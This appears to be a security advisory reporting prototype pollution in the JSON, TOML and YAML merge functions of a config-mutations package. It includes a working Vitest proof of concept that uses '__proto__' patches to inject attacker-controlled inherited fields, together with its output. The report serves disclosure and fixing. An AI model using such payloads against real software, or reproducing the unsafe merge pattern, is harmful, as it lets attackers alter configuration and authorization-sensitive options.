# Config mutations format merges proto properties mutate output prototypes

## Summary

The exported JSON, TOML, and YAML format implementations in `@poe-code/config-mutations` deep-merge parsed configuration patches into ordinary JavaScript objects using bracket assignment. In each format, a parsed `__proto__` mapping is not preserved as data; it changes the prototype of the returned merged configuration and exposes attacker-controlled inherited fields.

## Reproduction

Run a transient Vitest probe from the repository root:

```sh
cat > packages/config-mutations/src/__probe__.test.ts <<'PROBE'
import { describe, expect, it } from "vitest";
import { jsonFormat } from "./formats/json.js";
import { tomlFormat } from "./formats/toml.js";
import { yamlFormat } from "./formats/yaml.js";

describe("config format proto keys", () => {
  it("mutates merged format output prototypes from parsed __proto__ patches", () => {
    const jsonResult = jsonFormat.merge({}, JSON.parse('{"__proto__":{"owner":"json-attacker"}}') as never);
    const tomlResult = tomlFormat.merge({}, tomlFormat.parse('["__proto__"]\nowner = "toml-attacker"\n'));
    const yamlResult = yamlFormat.merge({}, yamlFormat.parse('__proto__:\n  owner: yaml-attacker\n'));
    console.log(JSON.stringify({ jsonOwnsProto: Object.hasOwn(jsonResult, "__proto__"), jsonOwner: (jsonResult as { owner?: string }).owner, tomlOwnsProto: Object.hasOwn(tomlResult, "__proto__"), tomlOwner: (tomlResult as { owner?: string }).owner, yamlOwnsProto: Object.hasOwn(yamlResult, "__proto__"), yamlOwner: (yamlResult as { owner?: string }).owner }));
    expect((jsonResult as { owner?: string }).owner).toBe("json-attacker");
    expect((tomlResult as { owner?: string }).owner).toBe("toml-attacker");
    expect((yamlResult as { owner?: string }).owner).toBe("yaml-attacker");
  });
});
PROBE
npm exec -- vitest run packages/config-mutations/src/__probe__.test.ts --reporter verbose
rm packages/config-mutations/src/__probe__.test.ts
```

Output:

```text
{"jsonOwnsProto":false,"jsonOwner":"json-attacker","tomlOwnsProto":false,"tomlOwner":"toml-attacker","yamlOwnsProto":false,"yamlOwner":"yaml-attacker"}
✓ packages/config-mutations/src/__probe__.test.ts > config format proto keys > mutates merged format output prototypes from parsed __proto__ patches
```

## Observed Behavior

Each exported format implements `merge()` by creating `result` as `{ ...base }`, iterating `Object.entries(patch)`, and assigning `result[key] = value` when it reaches leaf values: JSON at `packages/config-mutations/src/formats/json.ts:41` through `packages/config-mutations/src/formats/json.ts:55`, TOML at `packages/config-mutations/src/formats/toml.ts:24` through `packages/config-mutations/src/formats/toml.ts:38`, and YAML at `packages/config-mutations/src/formats/yaml.ts:27` through `packages/config-mutations/src/formats/yaml.ts:41`. For a parsed `__proto__` key, assignment invokes the inherited prototype setter instead of creating an own configuration value.

## Expected Behavior

Deep-merging parsed configuration content should preserve explicit configuration keys without mutating JavaScript prototypes. The format implementations should use prototype-safe objects or property definition logic, or reject unsafe keys consistently before returning merged data.

## Impact

Any provider or feature using these shared mutation formats can accept a crafted JSON, TOML, or YAML configuration patch and receive inherited attacker-controlled values in the resulting public configuration object. This can alter configuration interpretation, authorization-sensitive options, or later merge/prune behavior while the mutation appears to have succeeded normally.
